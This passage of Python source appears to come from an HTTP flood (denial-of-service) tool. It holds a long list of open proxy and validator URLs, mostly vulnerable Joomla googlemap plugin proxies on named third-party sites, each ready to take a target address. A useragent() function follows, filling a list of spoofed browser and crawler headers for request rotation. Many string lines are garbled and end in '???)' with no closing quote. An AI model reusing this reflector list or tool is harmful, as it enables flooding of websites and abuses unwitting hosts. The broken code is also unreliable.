     "http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=",
     "http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&url=",
     "http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
     "http://validator.w3.org/nu/?doc=",
     "http://check-host.net/check-http?host=",
     "http://www.netvibes.com/subscribe.php?url=",
     "http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.google.com/ig/add?feedurl=",
     "http://anonymouse.org/cgi-bin/anon-www.cgi/",
     "http://www.google.com/translate?u=",
     "http://translate.google.com/translate?u=",
     "http://validator.w3.org/feed/check.cgi?url=",
     "http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
     "http://validator.w3.org/check?uri=",
     "http://jigsaw.w3.org/css-validator/validator?uri=",
     "http://validator.w3.org/checklink?uri=",
     "http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
     "http://www.w3.org/RDF/Validator/ARPServlet?uri=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=",
     "http://www.w3.org&xslfile=",
     "http://www.w3.org/services/tidy?docAddr=",
     "http://validator.w3.org/mobile/check?docAddr=",
     "http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
     "http://validator.w3.org/p3p/20020128/policy.pl?uri=",
     "http://online.htmlvalidator.com/php/onlinevallite.php?url=",
     "http://feedvalidator.org/check.cgi?url=",
     "http://gmodules.com/ig/creator?url=",
     "http://www.google.com/ig/adde?moduleurl=",
     "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=",
     "http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
     "http://host-tracker.com/check_page/?furl=",
     "http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
     "http://www.viewdns.info/ismysitedown/?domain=",
     "http://www.onlinewebcheck.com/check.php?url=",
     "http://www.online-translator.com/url/translation.aspx?direction=er&sourceurl=",
     "http://www.translate.ru/url/translation.aspx?direction=er&sourceurl=",
     "http://about42.nl/www/showheaders.php;POST;about42.nl.txt",
     "http://browsershots.org;POST;browsershots.org.txt",
     "http://streamitwebseries.twww.tv/proxy.php?url=",
     "http://www.comicgeekspeak.com/proxy.php?url=",
     "http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://thevintagechurch.com/www2/index.php?url=/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
     "http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt",
     "http://web-sniffer.net/?url=",
     "http://www.map-mc.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.awf.co.nz/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=",
     "http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=",
     "http://translate.yandex.net/tr-url/ru-uk.uk/",
     "http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.phimedia.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.epcelektrik.com/en/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=",
]


def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
    headers.append("AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)???)
    headers.append("AppleTV5,3/9.1.1???)
    headers.append("AppleTV6,2/11.1???)
    headers.append("Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)???)
    headers.append("Baiduspider ( http://www.baidu.com/search/spider.htm)???)
    headers.append("BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)???)
    headers.append("BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103???)
    headers.append("BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0)???)
    headers.append("BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0???)
    headers.append("BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100???)
    headers.append("BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105???)
    headers.append("BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102???)
    headers.append("BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179???)
    headers.append("BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0???)
    headers.append("BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123???)
    headers.append("Bloglines/3.1 (http://www.bloglines.com)???)
    headers.append("BrowserEmulator/0.9 see http://dejavu.org???)
    headers.append("CSSCheck/1.2.2???)
    headers.append("Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)???)
    headers.append("Dillo/0.8.5-i18n-misc???)
    headers.append("Dillo/2.0???)
    headers.append("DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1; http://www.google.com/bot.html)???)
    headers.append("DoCoMo/2.0 SH901iC(c100;TB;W24H12)???)
    headers.append("Download Demon/3.5.0.11???)
    headers.append("ELinks (0.4pre5; Linux 2.6.10-ac7 i686; 80x33)???)
    headers.append("ELinks/0.9.3 (textmode; Linux 2.6.9-kanotix-8 i686; 127x41)???)
    headers.append("ELinks/0.10.5 (textmode; FreeBSD 4.11-STABLE i386; 80x22-2)???)
    headers.append("ELinks/0.12~pre5-4???)
    headers.append("Emacs-W3/4.0pre.46 URL/p4.0pre.46 (i386--freebsd; X11)???)
    headers.append("EmailWolf 1.00???)
    headers.append("everyfeed-spider/2.0 (http://www.everyfeed.com)???)
    headers.append("facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php)???)
    headers.append("FAST-WebCrawler/3.8 (crawler at trd dot overture dot com; http://www.alltheweb.com/help/webmaster/crawler)???)
    headers.append("FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)???)
    headers.append("Gaisbot/3.0 (robot@gais.cs.ccu.edu.tw; http://gais.cs.ccu.edu.tw/robot.php)???)
    headers.append("Googlebot-Image/1.0???)
    headers.append("Googlebot-News???)
    headers.append("Googlebot-Video/1.0???)
    headers.append("Googlebot/2.1 ( http://www.googlebot.com/bot.html)???)
    headers.append("Googlebot/2.1 (+http://www.google.com/bot.html)???)
    headers.append("Googlebot/2.1 (http://www.googlebot.com/bot.html)???)
    headers.append("Gregarius/0.5.2 ( http://devlog.gregarius.net/docs/ua)???)
    headers.append("grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)???)
    headers.append("Gulper Web Bot 0.2.4 (www.ecsl.cs.sunysb.edu/~maxim/cgi-bin/Link/GulperBot)???)
    headers.append("HTC-ST7377/1.59.502.3 (67150) Opera/9.50 (Windows NT 5.1; U; en) UP.Link/6.3.1.17.0???)
    headers.append("HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1???)
    headers.append("HTMLParser/1.6???)
    headers.append("iCCrawler (http://www.iccenter.net/bot.htm)???)
    headers.append("iTunes/4.2 (Macintosh; U; PPC Mac OS X 10.2)???)
    headers.append("iTunes/9.0.2 (Windows; N)???)
    headers.append("iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)???)
    headers.append("Java/1.4.1_04???)
    headers.append("Java/1.6.0_13???)
    headers.append("Jigsaw/2.2.5 W3C_CSS_Validator_JFouffa/2.0???)
    headers.append("Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)???)
    headers.append("LG-GC900/V10a Obigo/WAP2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1???)
    headers.append("LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("libwww-perl/5.79???)
    headers.append("libwww-perl/5.820???)
    headers.append("Links (0.96; OpenBSD 3.0 sparc)???)
    headers.append("Links (1.00pre12; Linux 2.6.14.2.20051115 i686; 80x24) (Debian pkg 0.99+1.00pre12-1)???)
    headers.append("Links (2.1pre14; IRIX64 6.5 IP27; 145x54)???)
    headers.append("Links (2.1pre15; FreeBSD 5.3-RELEASE i386; 196x84)???)
    headers.append("Links (2.1pre15; FreeBSD 5.4-STABLE i386; 158x58)???)
    headers.append("Links (2.1pre15; Linux 2.4.26 i686; 158x61)???)
    headers.append("Links (2.1pre15; SunOS 5.8 sun4m; 80x24)???)
    headers.append("Links (2.1pre19; NetBSD 2.1_STABLE sparc64; 145x54)???)
    headers.append("Links (2.1pre20; FreeBSD 4.11-STABLE i386; 80x22)???)
    headers.append("Links (2.1pre20; NetBSD 2.1_STABLE i386; 145x54)???)
    headers.append("Links (2.1pre20; SunOS 5.10 sun4u; 80x22)???)
    headers.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)???)
    headers.append("Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)???)
    headers.append("Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)???)
    headers.append("Links/0.9.1 (Linux 2.4.24; i386;)???)
    headers.append("lwp-trivial/1.41???)
    headers.append("Lynx/2.8.2rel.1 libwww-FM/2.14???)
    headers.append("Lynx/2.8.3rel.1 libwww-FM/2.14???)
    headers.append("Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.6c???)
    headers.append("Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7c???)
    headers.append("Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12???)
    headers.append("Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/1.0.16???)
    headers.append("Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d???)
    headers.append("Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7e???)
    headers.append("Lynx/2.8.5rel.3 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d???)
    headers.append("Lynx/2.8.5rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d-p1???)
    headers.append("Lynx/2.8.5rel.5 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d???)
    headers.append("Lynx/2.8.5rel.5 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i???)
    headers.append("Lynx/2.8.6dev.15 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d???)
    headers.append("Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g???)
    headers.append("Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d???)
    headers.append("Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2???)
    headers.append("Mediapartners-Google???)
    headers.append("Mediapartners-Google/2.1???)
    headers.append("Microsoft URL Control - 6.00.8862???)
    headers.append("Midori/0.1.10 (X11; Linux i686; U; en-us) WebKit/(531).(2)???)
    headers.append("MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0???)
    headers.append("MOT-V9mm/00.62 UP.Browser/6.2.3.4.c.1.123 (GUI) MMP/2.0???)
    headers.append("MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12 (GUI) MMP/2.0 UP.Link/6.3.1.13.0???)
    headers.append("MOTORIZR-Z8/46.00.00 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 356) Opera 8.65 [it] UP.Link/6.3.0.0.0???)
    headers.append("Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)???)
    headers.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)???)
    headers.append("Mozilla/1.22 (compatible; MSIE 5.01; PalmOS 3.0) EudoraWeb 2.1???)
    headers.append("Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)???)
    headers.append("Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1???)
    headers.append("Mozilla/2.0 (compatible; Ask Jeeves/Teoma)???)
    headers.append("Mozilla/2.02E (Win95; U)???)
    headers.append("Mozilla/3.0 (compatible; NetPositive/2.1.1; BeOS)???)
    headers.append("Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)???)
    headers.append("Mozilla/3.0 (x86 [de] Windows NT 5.0; Sun)???)
    headers.append("Mozilla/3.01Gold (Win95; I)???)
    headers.append("Mozilla/4.0 (compatible- MSIE 6.0- Windows NT 5.1- SV1- .NET CLR 1.1.4322???)
    headers.append("Mozilla/4.0 (compatible; Arachmo)???)
    headers.append("Mozilla/4.0 (compatible; AvantGo 6.0; FreeBSD)???)
    headers.append("Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)???)
    headers.append("Mozilla/4.0 (compatible; Cerberian Drtrs Version-3.2-Build-0)???)
    headers.append("Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)???)
    headers.append("Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 600x800)???)
    headers.append("Mozilla/4.0 (compatible; Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727); Windows NT 5.1; Trident/4.0; Maxthon; .NET CLR 2.0.50727; .NET CLR 1.1.4322; InfoPath.2)???)
    headers.append("Mozilla/4.0 (compatible; Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729); Windows NT 5.1; Trident/4.0)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; MDA Pro/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.0; Series80/2.0 Nokia9500/4.51 Profile/MIDP-2.0 Configuration/CLDC-1.1)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.0; Windows 95)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.01; Windows 98)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)???)
